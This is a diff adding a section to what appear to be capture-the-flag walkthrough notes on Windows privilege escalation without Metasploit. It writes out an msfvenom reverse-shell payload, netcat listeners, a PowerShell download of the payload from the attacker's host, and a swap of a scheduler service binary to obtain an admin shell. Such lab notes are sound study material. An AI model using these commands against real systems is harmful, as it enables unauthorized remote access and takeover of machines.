@@ -170,8 +170,33 @@ search -f root.txt
 To see what abnormal service is running:
 tasklist /SVC            - in dumb shell
 
+------------------------------------------------------------------------------------------------------------
+Privilege Escalation WITHOUT Metasploit/Meterpreter
+Do everything same up until you get first shell from the Blog file upload.
 
 
+msfvenom -p windows/shell_reverse_tcp LHOST=[LOCALIP] LPORT=9001 -f exe > shell.exe
+nc -lvnp 9001
+python3 -m http.server            - Start up a python http server
+
+Pull it onto C:\Windows\Temp with powershell:
+powershell -c "Invoke-WebRequest -Uri 'http://[LOCALIP]:8000/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"
+
+
+.\shell.exe            - you have now pivoted to a more stable shell
+
+
+on upgraded shell:
+nc -lvnp 9001 start another netcat listener for your upcoming root shell 
+
+cd C:\"Program Files (x86)
+cd SystemScheduler
+
+move C:\Windows\Temp\shell.exe shell.exe
+move Message.exe Message.bak
+move shell.exe Message.exe
+
+Wait for admin shell to come through on your netcat 9001 listener.
 
 
 
